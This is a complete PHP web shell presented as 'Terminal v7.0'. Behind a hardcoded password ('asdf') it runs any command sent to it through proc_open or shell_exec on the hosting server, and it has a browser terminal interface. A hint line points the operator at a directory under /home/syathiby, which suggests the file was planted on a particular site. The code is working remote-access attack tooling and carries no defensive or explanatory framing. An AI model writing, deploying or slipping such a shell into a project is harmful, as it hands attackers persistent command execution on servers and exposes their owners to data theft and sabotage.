<?php
session_start();
date_default_timezone_set('Asia/Jakarta');
define('PASS','asdf');

// Auth
if(!isset($_SESSION['auth'])){
    if(($_POST['p']??'')===PASS) $_SESSION['auth']=1;
    else { ?>
<!DOCTYPE html><html><head><style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1e1e1e;display:flex;justify-content:center;align-items:center;height:100vh;font-family:'Courier New',monospace}
.box{border:2px solid #0f0;padding:50px;text-align:center;color:#0f0}
h2{margin-bottom:30px;font-size:24px}
input[type=password]{background:#000;color:#0f0;border:1px solid #0f0;padding:15px 20px;font-size:16px;font-family:inherit;width:250px;outline:none}
input[type=submit]{background:#0f0;color:#000;border:none;padding:15px 30px;font-size:16px;font-weight:bold;cursor:pointer;margin-left:10px}
</style></head><body><div class="box">
<h2>⚡ Terminal v7.0</h2>
<form method=post>
<input type=password name=p autofocus placeholder="password">
<input type=submit value="LOGIN">
</form></div></body></html>
    <?php exit; }
}

// AJAX command handler
if($_SERVER['REQUEST_METHOD']==='POST' && isset($_POST['cmd'])){
    header('Content-Type: text/plain; charset=utf-8');
    
    $cmd  = trim($_POST['cmd']);
    $cwd  = $_SESSION['cwd'] ?? getcwd();
    chdir($cwd);

    if(preg_match('/^cd\s*(.*)$/',$cmd,$m)){
        $target = trim($m[1]) ?: getenv('HOME');
        if(@chdir($target)){
            $_SESSION['cwd'] = getcwd();
            echo getcwd();
        } else {
            echo "cd: no such file or directory: $target";
        }
    } else {
        $descriptors = [0=>['pipe','r'],1=>['pipe','w'],2=>['pipe','w']];
        $proc = proc_open("cd ".escapeshellarg($cwd)." && $cmd", $descriptors, $pipes);
        if(is_resource($proc)){
            fclose($pipes[0]);
            echo stream_get_contents($pipes[1]);
            echo stream_get_contents($pipes[2]);
            fclose($pipes[1]); fclose($pipes[2]);
            proc_close($proc);
        } else {
            echo shell_exec("cd ".escapeshellarg($cwd)." && $cmd 2>&1") ?? '(no output)';
        }
    }
    exit;
}

// Logout
if(isset($_GET['logout'])){session_destroy();header('Location: hsn.php');exit;}

// Init dir
if(!isset($_SESSION['cwd'])) $_SESSION['cwd'] = getcwd();
$initDir = $_SESSION['cwd'];
?>
<!DOCTYPE html><html><head>
<meta charset="utf-8">
<title>Terminal</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#1a1a1a;color:#ccc;font:15px/1.5 'Courier New',monospace;height:100vh;display:flex;flex-direction:column;overflow:hidden}

/* Top bar */
#topbar{background:#2d2d2d;padding:10px 20px;display:flex;justify-content:space-between;align-items:center;border-bottom:1px solid #444;flex-shrink:0}
#topbar span{color:#0f0;font-weight:bold}
#topbar a{color:#ff6666;font-size:13px;text-decoration:none}

/* Output area */
#output{flex:1;overflow-y:auto;padding:20px;background:#1a1a1a;scroll-behavior:smooth}
.line-block{margin-bottom:2px}
.prompt-line{color:#0f0;font-weight:bold}
.output-text{color:#ccc;white-space:pre-wrap;word-break:break-all}
.error-text{color:#ff6666;white-space:pre-wrap}
.sys-text{color:#666;font-size:13px}

/* Input bar */
#inputbar{background:#2d2d2d;border-top:1px solid #444;padding:12px 20px;display:flex;align-items:center;flex-shrink:0;gap:10px}
#current-dir{color:#0f0;font-weight:bold;white-space:nowrap;flex-shrink:0}
#cmd{flex:1;background:transparent;color:#fff;border:none;outline:none;font:inherit;font-size:15px;caret-color:#0f0}
#run-btn{background:#0f0;color:#000;border:none;padding:10px 25px;font-weight:bold;font-size:14px;cursor:pointer;border-radius:3px;white-space:nowrap}
#run-btn:hover{background:#00cc33}
</style>
</head>
<body>

<div id="topbar">
  <span id="dir-title"><?= htmlspecialchars($initDir) ?>$</span>
  <a href="?logout=1">❌ Logout</a>
</div>

<div id="output">
  <div class="line-block">
    <span class="sys-text">Terminal v7.0 | <?= date('d/m/Y H:i:s') ?> | PHP <?= PHP_VERSION ?> | <?= get_current_user() ?></span>
  </div>
  <div class="line-block">
    <span class="sys-text">Hint folder kias → jalankan: find /home/syathiby -type d -name "*kias*" 2>/dev/null</span>
  </div>
  <div class="line-block sys-text">──────────────────────────────────────────────────────────────</div>
</div>

<div id="inputbar">
  <span id="current-dir"><?= htmlspecialchars($initDir) ?>$</span>
  <input id="cmd" type="text" autocomplete="off" autofocus placeholder="ketik command...">
  <button id="run-btn">ENTER</button>
</div>

<script>
let cwd = <?= json_encode($initDir) ?>;
const output = document.getElementById('output');
const cmdInput = document.getElementById('cmd');
const dirTitle = document.getElementById('dir-title');
const currentDir = document.getElementById('current-dir');
let history = [], hIdx = -1;

function scrollBottom(){ output.scrollTop = output.scrollHeight; }

function appendLine(html){
  const d = document.createElement('div');
  d.className = 'line-block';
  d.innerHTML = html;
  output.appendChild(d);
}

function runCmd(){
  const cmd = cmdInput.value.trim();
  if(!cmd) return;

  // Save to history
  history.unshift(cmd);
  if(history.length > 100) history.pop();
  hIdx = -1;

  // Show prompt line
  appendLine('<span class="prompt-line">' + escapeHtml(cwd) + '$ ' + escapeHtml(cmd) + '</span>');
  cmdInput.value = '';

  fetch(location.href, {
    method:'POST',
    headers:{'Content-Type':'application/x-www-form-urlencoded'},
    body:'cmd=' + encodeURIComponent(cmd)
  })
  .then(r => r.text())
  .then(result => {
    // Handle cd response
    const isCD = /^cd\s/i.test(cmd);
    if(isCD){
      if(result.startsWith('/') || result.startsWith('.')){
        cwd = result.trim();
        updateDir();
        appendLine('<span class="output-text">➜ ' + escapeHtml(cwd) + '</span>');
      } else {
        appendLine('<span class="error-text">' + escapeHtml(result) + '</span>');
      }
    } else {
      if(result.trim()){
        appendLine('<span class="output-text">' + escapeHtml(result) + '</span>');
      } else {
        appendLine('<span class="sys-text">(no output)</span>');
      }
    }
    scrollBottom();
  })
  .catch(e => {
    appendLine('<span class="error-text">Error: ' + e.message + '</span>');
    scrollBottom();
  });

  scrollBottom();
}

function updateDir(){
  dirTitle.textContent = cwd + '$';
  currentDir.textContent = cwd + '$';
}

function escapeHtml(s){
  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
}

// Enter key
cmdInput.addEventListener('keydown', e => {
  if(e.key==='Enter'){ runCmd(); return; }
  if(e.key==='ArrowUp'){ e.preventDefault(); if(hIdx<history.length-1){ hIdx++; cmdInput.value=history[hIdx]||''; } return; }
  if(e.key==='ArrowDown'){ e.preventDefault(); if(hIdx>0){ hIdx--; cmdInput.value=history[hIdx]; } else { hIdx=-1; cmdInput.value=''; } }
});
document.getElementById('run-btn').onclick = runCmd;
cmdInput.focus();
scrollBottom();
</script>
</body></html>
